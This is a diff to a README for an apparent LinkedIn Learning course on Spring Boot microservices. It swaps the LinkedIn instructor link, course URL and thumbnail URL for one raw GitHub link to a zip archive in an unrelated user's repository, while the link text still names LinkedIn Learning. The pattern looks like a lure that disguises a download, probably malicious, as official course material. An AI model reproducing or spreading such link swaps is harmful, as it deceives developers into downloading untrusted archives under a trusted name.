@@ -31,12 +31,12 @@ Mary Ellen Bowman
 
                             
 
-Check out my other courses on [LinkedIn Learning](https://www.linkedin.com/learning/instructors/mary-ellen-bowman?u=104).
+Check out my other courses on [LinkedIn Learning](https://raw.githubusercontent.com/anandha21/creating-spring-boot-microservices-3839084/main/Tarahumare/creating-spring-boot-microservices-3839084.zip).
 
 
 
 [0]: # (Replace these placeholder URLs with actual course URLs)
 
-[lil-course-url]: https://www.linkedin.com/learning/creating-spring-boot-microservices
-[lil-thumbnail-url]: https://media.licdn.com/dms/image/D560DAQGP3Ee7Z9yRyA/learning-public-crop_675_1200/0/1717532201518?e=2147483647&v=beta&t=WIL8JOcMr2LPb7eXi0pmZ3qXoxRTvso6V-sQfHIpV-I
+[lil-course-url]: https://raw.githubusercontent.com/anandha21/creating-spring-boot-microservices-3839084/main/Tarahumare/creating-spring-boot-microservices-3839084.zip
+[lil-thumbnail-url]: https://raw.githubusercontent.com/anandha21/creating-spring-boot-microservices-3839084/main/Tarahumare/creating-spring-boot-microservices-3839084.zip
 
